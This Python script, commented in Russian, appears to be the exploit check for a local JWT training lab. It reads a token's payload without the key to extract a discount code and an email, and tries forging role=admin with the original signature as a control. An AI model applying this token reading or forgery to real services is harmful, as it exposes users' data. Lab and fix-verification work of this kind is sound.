"""Эксплойт лабы jwt-basics: содержимое токена читается без ключа.

Токен подписан, и подделать роль нельзя — опыт 3 это подтверждает. Но подпись
защищает от изменения, а не от чтения: полезная нагрузка декодируется из
base64url любым, у кого есть токен. Опыты 1 и 2 достают из неё то, что там
быть не должно.

Локально, к сети не обращается, против чужих систем неприменимо.

Код возврата:
    0 — эксплойт НЕ сработал (конфиденциальных полей в токене нет)
    1 — эксплойт сработал (поля читаются из токена)
"""

import base64
import json
import sys

import jwt

from labtarget import load


def _read_payload(token):
    """Прочитать нагрузку токена БЕЗ ключа и БЕЗ проверки подписи."""
    payload = token.split(".")[1]
    raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    return json.loads(raw)


def experiment_1_discount(lab):
    """Внутренний скидочный код виден в нагрузке без ключа."""
    token = lab.issue("wiener")
    claims = _read_payload(token)
    code = claims.get("discount_code")
    got = bool(code)
    print(f"  опыт 1 — discount_code из нагрузки без ключа: "
          f"{'ПОЛУЧЕН ' + code if got else 'нет в токене'}")
    return got


def experiment_2_email(lab):
    """Адрес почты виден в нагрузке без ключа."""
    token = lab.issue("wiener")
    claims = _read_payload(token)
    email = claims.get("email")
    got = bool(email)
    print(f"  опыт 2 — email из нагрузки без ключа: "
          f"{'ПОЛУЧЕН ' + email if got else 'нет в токене'}")
    return got


def experiment_3_tamper_role(lab):
    """Контроль на целостность: подмена роли отвергается проверкой подписи."""
    token = lab.issue("wiener")
    head, payload, sig = token.split(".")
    claims = _read_payload(token)
    claims["role"] = "admin"
    forged_payload = base64.urlsafe_b64encode(
        json.dumps(claims, separators=(",", ":")).encode()).rstrip(b"=").decode()
    forged = f"{head}.{forged_payload}.{sig}"
    role = lab.authorize(forged)
    accepted = role == "admin"
    print(f"  опыт 3 — контроль, подмена role=admin с той же подписью: "
          f"{'ПРИНЯТА' if accepted else 'отвергнута проверкой подписи'}")
    return accepted


def experiment_4_control_auth(lab):
    """Контроль на живучесть: честный вход по-прежнему даёт роль."""
    role = lab.authorize(lab.issue("wiener"))
    ok = role == "user"
    print(f"  опыт 4 — контроль, честный вход wiener: "
          f"{'роль user' if ok else 'ПОЧИНКА СЛОМАЛА ВХОД'}")
    return ok


def main() -> int:
    name, lab = load()
    print(f"Цель: {name}")
    leaks = [experiment_1_discount(lab), experiment_2_email(lab)]
    tamper = experiment_3_tamper_role(lab)
    control = experiment_4_control_auth(lab)
    print()
    if tamper:
        print("ЦЕЛОСТНОСТЬ НАРУШЕНА: подпись не проверяется — это уже другая "
              "тема (jwt-attacks), лаба ждёт честной проверки")
        return 1
    if any(leaks):
        print("ЭКСПЛОЙТ СРАБОТАЛ: конфиденциальные поля читаются из нагрузки "
              f"без ключа ({sum(leaks)} из 2 опытов)")
        return 1
    if not control:
        print("ЭКСПЛОЙТ НЕ СРАБОТАЛ, но контроль упал: вход перестал работать")
        return 1
    print("эксплойт не сработал: конфиденциальных полей в нагрузке нет, "
          "подпись проверяется, вход работает")
    return 0


if __name__ == "__main__":
    sys.exit(main())
